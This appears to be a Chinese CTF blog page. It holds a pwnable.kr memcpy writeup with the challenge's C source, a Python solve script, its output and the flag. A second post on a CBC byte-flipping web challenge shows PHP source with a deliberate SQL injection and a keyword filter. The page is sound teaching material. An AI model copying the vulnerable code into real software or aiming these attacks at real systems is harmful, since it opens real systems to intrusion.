class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">		dest[i] = src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line">	<span class="comment">// 64-byte block fast copy</span></span><br><span class="line">	<span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">		i = len / <span class="number">64</span>;</span><br><span class="line">		len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			__asm__ __volatile__ (</span><br><span class="line">			<span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">			<span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">			<span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">			<span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">			<span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">			::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br><span class="line">			dest += <span class="number">64</span>;</span><br><span class="line">			src += <span class="number">64</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">	<span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line">	<span class="keyword">int</span> e;</span><br><span class="line">	<span class="keyword">char</span>* src;</span><br><span class="line">	<span class="keyword">char</span>* dest;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">	<span class="comment">// allocate memory</span></span><br><span class="line">	<span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// setup experiment parameters</span></span><br><span class="line">	<span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;	<span class="comment">// 2^13 = 8K</span></span><br><span class="line">		low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">		high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">		<span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] = size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// run experiment</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">		size = sizes[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</span><br><span class="line">		dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		<span class="comment">// block-to-block memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序的大概逻辑是比较两个内存复制算法<code>slow_memcpy</code>和<code>fast_memcpy</code>的效率。其中，程序要求输入10次要分配的内存大小，每次大小都限定在两个相邻的2的幂次之间，并且使用<code>malloc</code>函数来分配内存，如果所有步骤执行完毕程序会在最后输出flag。<br>先是按照要求跑一遍程序，发现程序最后会在某一次比较中突然停下，也就是说程序异常退出了。当时真不知道咋回事，也没有自己编译调试程序，于是便参考了人家的writeup，并有了思路。</p>
<ul>
<li><code>fast_memcpy</code>函数中用于内存复制的两个指令<code>movdqa</code>和<code>movntps</code>他们的操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。</li>
<li><code>malloc</code>在分配内存时它实际上还会多分配4字节用于存储堆块信息，所以如果分配a字节实际上分配的是<code>a+4</code>字节。另外32位系统上该函数分配的内存是以8字节对齐的。</li>
</ul>
<p>有了这两点就知道程序的异常退出是因为分配的内存没有16字节对齐，那么要getflag只需要每次分配的内存地址能够被16整除就可以了（实际上由于<code>malloc</code>函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    host = <span class="string">'pwnable.kr'</span></span><br><span class="line">    port = <span class="number">9022</span></span><br><span class="line">    </span><br><span class="line">    sock = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    sock.connect((host,port))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> sock.recv(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">4</span>,<span class="number">14</span>):</span><br><span class="line">        tmp = <span class="number">2</span>**i<span class="number">-4</span></span><br><span class="line">        <span class="keyword">print</span> sock.recv(<span class="number">1024</span>),tmp</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        sock.send(str(tmp)+<span class="string">'\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">work()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\Desktop&gt;python 2.py</span><br><span class="line">Hey, I have a boring assignment <span class="keyword">for</span> CS class.. :(</span><br><span class="line"></span><br><span class="line">The assignment is simple.</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">- What is the best implementation of memcpy?        -</span><br><span class="line">- 1. implement your own slow/fast version of memcpy -</span><br><span class="line">- 2. compare them with various size of data         -</span><br><span class="line">- 3. conclude your experiment and submit report     -</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">This time, just <span class="built_in">help</span> me out with my experiment and get flag</span><br><span class="line">No fancy hacking, I promise :D</span><br><span class="line">specify the memcpy amount between 8 ~ 16 :  12</span><br><span class="line">specify the memcpy amount between 16 ~ 32 :  28</span><br><span class="line">specify the memcpy amount between 32 ~ 64 :  60</span><br><span class="line">specify the memcpy amount between 64 ~ 128 :  124</span><br><span class="line">specify the memcpy amount between 128 ~ 256 :  252</span><br><span class="line">specify the memcpy amount between 256 ~ 512 :  508</span><br><span class="line">specify the memcpy amount between 512 ~ 1024 :  1020</span><br><span class="line">specify the memcpy amount between 1024 ~ 2048 :  2044</span><br><span class="line">specify the memcpy amount between 2048 ~ 4096 :  4092</span><br><span class="line">specify the memcpy amount between 4096 ~ 8192 :  8188</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">experiment 1 : memcpy with buffer size 12</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 1251</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 420</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 28</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 414</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 405</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 60</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 795</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 759</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 124</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 1539</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 807</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 252</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 3054</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 825</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 508</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 6147</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 879</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 1020</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 12384</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 999</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 2044</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 24120</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy</span><br><span class="line">: 1389</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 4092</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 50781</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 2184</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 8188</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> slow_memcpy : 105690</span><br><span class="line">ellapsed CPU cycles <span class="keyword">for</span> fast_memcpy : 3801</span><br><span class="line"></span><br><span class="line">thanks <span class="keyword">for</span> helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\admin\Desktop&gt;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题又学习到了新知识。学到了两个命令，以及32位系统上<code>malloc</code>函数分配时另加4字节的堆块信息内存8字节对齐。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/09/实验吧-简单的登录题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/09/实验吧-简单的登录题/" itemprop="url">
                  实验吧-简单的登录题
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-09 14:41:00" itemprop="dateCreated datePublished" datetime="2018-02-09T14:41:00+08:00">2018-02-09</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:36:17" itemprop="dateModified" datetime="2018-08-04T22:36:17+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/09/实验吧-简单的登录题/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/09/实验吧-简单的登录题/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/09/实验吧-简单的登录题/" class="leancloud_visitors" data-flag-title="实验吧-简单的登录题">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是在<a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">实验吧</a>上面的一道web题。主要考察cbc字节反转攻击。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目开始就是输入id去登录</p>
<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/802802995.jpg" alt="1"></p>
<p>首先想到的就是sql注入了，输入<code>1&#39;</code>后页面显示<code>Hello</code>，重新载入的话页面返回报错信息</p>
<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/470497557.jpg" alt="2"></p>
<p>确实存在注入，看那后面的逗号，猜测注入点在<code>limit</code>后面。然后试了很多，发现题目把<code>union,#，procedure</code>等都过滤了，暂时没想到任何绕过的方法。然后抓包看看消息头看看有没有提示</p>
<p><img src="http://www.ktstartblog.top/usr/uploads/2018/02/551609679.jpg" alt="3"></p>
<p>提示存在<code>test.php</code>文件，访问后是php源码，接下来就是源码分析了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqliCheck</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">	$iv = get_random_iv();</span><br><span class="line">	$plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $link;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $sql=<span class="string">"select * from users limit "</span>.$info[<span class="string">'id'</span>].<span class="string">",0"</span>;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>  <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!'</span>.$rows[<span class="string">'username'</span>].<span class="string">'&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = (string)$_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sqliCheck($id))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span>);</span><br><span class="line">    $info = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"iv"</span>])&amp;&amp;<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span 